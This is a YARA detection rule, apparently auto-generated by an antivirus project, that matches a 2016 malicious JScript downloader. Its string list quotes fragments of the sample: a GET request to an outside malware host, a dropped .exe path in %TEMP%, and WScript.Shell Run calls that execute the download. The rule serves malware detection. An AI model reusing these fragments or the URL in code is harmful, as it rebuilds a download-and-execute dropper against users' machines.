rule sig_20160329_608045a66bcd15fe6f4f3d919a44492b {
  meta:
    description = "datamaliciousorder - file 20160329_608045a66bcd15fe6f4f3d919a44492b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5a2d70a055a980da6fb2fe66bbc6144e1b0d53f97d0aed00f80e28acb41cdad8"

  strings:
    $s1  = "W[Mb](\"GET\", \"http://greenellebox.com/a1odk\", false);" fullword ascii
    $s2  = "function j() {return Y0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"IlPOejc8HDTE5.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[i0](ED() * 11); if (W[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function u(vd, Dr){d = d * 1; return vd - Dr;};" fullword ascii
    $s5  = "var Y0 = function S() {return WScript[Y](\"WScript.Shell\");}(), fP = 11;" fullword ascii
    $s6  = "function b(){return \"\" + I;};" fullword ascii
    $s7  = "function YN() {return ((yn == true) && (yn == qt)) ? 1 : d;};" fullword ascii
    $s8  = "function a(Uu){Y0[\"Run\"](Uu, d, d);};" fullword ascii
    $s9  = " while (D){" fullword ascii
    $s10 = "function i(){return Y;};" fullword ascii
    $s11 = "function My(va) {var zv = (1, 2, 3, 4, 5, va); return zv;};" fullword ascii
    $s12 = "var lk = new this[\"Date\"]();" fullword ascii
    $s13 = "return u(Xp, A);" fullword ascii
    $s14 = "function Qg()" fullword ascii
    $s15 = "function ED(){return 22;};" fullword ascii
    $s16 = "var A0 = false;" fullword ascii
    $s17 = "qt = true; " fullword ascii
    $s18 = "var qt = false;" fullword ascii
    $s19 = "var yn = false;" fullword ascii
    $s20 = "yn = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}